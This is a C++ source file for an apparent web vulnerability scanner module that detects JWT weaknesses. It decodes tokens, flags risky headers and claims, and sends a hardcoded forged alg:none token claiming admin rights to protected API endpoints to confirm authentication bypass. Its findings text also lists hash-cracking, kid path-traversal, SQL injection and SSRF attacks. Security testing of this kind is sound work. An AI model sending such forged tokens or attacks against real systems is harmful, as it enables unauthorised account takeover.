/// @file scanners/jwt_attacks.cpp
/// @brief JWT vulnerability scanner: none algorithm, weak secrets, algorithm confusion,
///        kid injection, jku/x5u spoofing, expired token acceptance, claim manipulation.
#include "scanner_base.hpp"
#include <regex>

namespace apex {
namespace {

/// Extract JWTs from responses (cookies, headers, body).
std::vector<std::string> extract_jwts(const Response &resp) {
  std::vector<std::string> jwts;
  // JWT pattern: base64url.base64url.base64url
  std::regex jwt_re(R"x(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)x");

  // Check body
  std::sregex_iterator it(resp.body.begin(), resp.body.end(), jwt_re);
  std::sregex_iterator end;
  for (; it != end; ++it) jwts.push_back((*it).str());

  // Check headers (Authorization, Set-Cookie)
  for (const auto &[key, val] : resp.headers) {
    std::sregex_iterator hit(val.begin(), val.end(), jwt_re);
    for (; hit != end; ++hit) jwts.push_back((*hit).str());
  }
  return jwts;
}

/// Base64url decode (no padding).
std::string b64url_decode(const std::string &input) {
  std::string s = input;
  std::replace(s.begin(), s.end(), '-', '+');
  std::replace(s.begin(), s.end(), '_', '/');
  while (s.size() % 4 != 0) s += '=';
  // Simple decode — just enough to read JSON
  static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  std::string out;
  int val = 0, bits = -8;
  for (char c : s) {
    if (c == '=') break;
    auto pos = chars.find(c);
    if (pos == std::string::npos) continue;
    val = (val << 6) + static_cast<int>(pos);
    bits += 6;
    if (bits >= 0) { out += char((val >> bits) & 0xFF); bits -= 8; }
  }
  return out;
}

/// Analyze JWT structure for vulnerabilities.
std::vector<Finding> scan_jwt_analysis(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Try login/auth endpoints to get a JWT
  std::vector<std::string> auth_paths = {
      "/api/auth/login", "/api/v1/auth/login", "/api/login",
      "/api/token", "/api/v1/token", "/oauth/token",
      "/api/session"};

  std::string jwt;
  for (const auto &path : auth_paths) {
    auto resp = http.get(base + path);
    auto jwts = extract_jwts(resp);
    if (!jwts.empty()) { jwt = jwts[0]; break; }

    // Also check the main page
    if (path == auth_paths[0]) {
      auto main = http.get(base);
      jwts = extract_jwts(main);
      if (!jwts.empty()) { jwt = jwts[0]; break; }
    }
  }

  // Also scan crawled responses for JWTs
  if (jwt.empty()) {
    for (const auto &url : crawl.urls) {
      auto resp = http.get(url);
      auto jwts = extract_jwts(resp);
      if (!jwts.empty()) { jwt = jwts[0]; break; }
    }
  }

  if (jwt.empty()) return findings;

  // Decode header
  auto dot1 = jwt.find('.');
  if (dot1 == std::string::npos) return findings;
  auto dot2 = jwt.find('.', dot1 + 1);
  if (dot2 == std::string::npos) return findings;

  std::string header_json = b64url_decode(jwt.substr(0, dot1));
  std::string payload_json = b64url_decode(jwt.substr(dot1 + 1, dot2 - dot1 - 1));

  findings.push_back(Finding{"JWT Token Found", "info", base,
                      "JWT detected in responses. Header: " + header_json.substr(0, 200),
                      "", "", "Payload preview: " + payload_json.substr(0, 200)});

  // Check for weak algorithms
  if (header_json.find("\"none\"") != std::string::npos) {
    findings.push_back(Finding{"JWT — None Algorithm", "critical", base,
                        "JWT uses 'none' algorithm — signature is not verified. "
                        "Attacker can forge any token with arbitrary claims.",
                        "alg", "none", ""});
  }

  if (header_json.find("\"HS256\"") != std::string::npos) {
    findings.push_back(Finding{"JWT — HS256 (Symmetric)", "medium", base,
                        "JWT uses HS256 (symmetric HMAC). Vulnerable to: "
                        "1) Brute-force weak secrets, "
                        "2) Algorithm confusion if server also has RSA public key (HS256 vs RS256). "
                        "Try: jwt-cracker or hashcat -m 16500.",
                        "alg", "HS256", ""});
  }

  // Check for kid header injection
  if (header_json.find("\"kid\"") != std::string::npos) {
    findings.push_back(Finding{"JWT — kid Header Present", "medium", base,
                        "JWT has 'kid' (Key ID) header. Test for: "
                        "1) Path traversal: kid=\"../../dev/null\" with empty secret, "
                        "2) SQL injection in kid lookup, "
                        "3) SSRF if kid is a URL.",
                        "kid", "", header_json});
  }

  // Check for jku/x5u headers (key URL — SSRF/spoofing)
  if (header_json.find("\"jku\"") != std::string::npos ||
      header_json.find("\"x5u\"") != std::string::npos) {
    findings.push_back(Finding{"JWT — External Key URL (jku/x5u)", "high", base,
                        "JWT references external key URL. Attacker can host their own "
                        "JWKS/certificate and forge tokens if URL validation is weak.",
                        "", "", header_json});
  }

  // Check payload for sensitive data
  if (payload_json.find("\"password\"") != std::string::npos ||
      payload_json.find("\"secret\"") != std::string::npos ||
      payload_json.find("\"credit_card\"") != std::string::npos) {
    findings.push_back(Finding{"JWT — Sensitive Data in Payload", "high", base,
                        "JWT payload contains sensitive fields. "
                        "JWTs are base64 encoded, NOT encrypted — anyone can read them.",
                        "", "", payload_json.substr(0, 300)});
  }

  // Check for missing expiration
  if (payload_json.find("\"exp\"") == std::string::npos) {
    findings.push_back(Finding{"JWT — No Expiration Claim", "medium", base,
                        "JWT has no 'exp' claim — token never expires. "
                        "Stolen tokens remain valid indefinitely.",
                        "", "", ""});
  }

  return findings;
}

/// Test if server accepts tokens with modified signature.
std::vector<Finding> scan_jwt_none_bypass(const Config &, HttpClient &http,
                                           const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Look for auth endpoints that return data
  std::vector<std::string> protected_paths = {
      "/api/me", "/api/v1/me", "/api/user", "/api/profile",
      "/api/account", "/api/v1/user/profile"};

  for (const auto &path : protected_paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 401 || resp.status_code == 403) {
      // Try with a forged none-algorithm token
      // eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0 = {"typ":"JWT","alg":"none"}
      // eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9 = {"sub":"1","admin":true}
      std::string forged = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.";

      auto test = http.get(base + path,
                           {{"Authorization", "Bearer " + forged}});
      if (test.status_code == 200 && test.body.size() > 50 &&
          test.body.find("unauthorized") == std::string::npos &&
          test.body.find("invalid") == std::string::npos) {
        findings.push_back(Finding{"JWT — None Algorithm Bypass CONFIRMED", "critical", base + path,
                            "Server accepts JWT with alg:none and no signature. "
                            "Complete authentication bypass — forge admin tokens at will.",
                            "", forged.substr(0, 50) + "...", ""});
        return findings;
      }
      break;
    }
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_jwt_attack_scanners() {
  return {
      {"JWT Analysis", scan_jwt_analysis},
      {"JWT None Bypass", scan_jwt_none_bypass},
  };
}

} // namespace apex
